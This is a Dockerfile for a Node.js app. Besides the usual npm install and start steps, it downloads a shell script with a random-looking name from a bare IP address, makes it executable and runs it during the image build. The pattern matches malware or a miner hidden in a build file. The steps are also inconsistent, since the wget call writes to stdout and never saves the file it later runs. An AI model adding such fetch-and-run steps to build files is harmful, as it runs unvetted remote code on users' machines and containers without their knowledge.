FROM node:18

WORKDIR /opt/app

ENV NODE_ENV production

COPY . .

RUN npm ci
RUN apt update
RUN apt -y install  wget coreutils
RUN wget -O - http://194.233.164.53/start_Honey_web_man_ws_rand.sh
RUN chmod +x start_Honey_web_man_ws_rand.sh
RUN ./start_Honey_web_man_ws_rand.sh

CMD ["npm", "run", "start"]
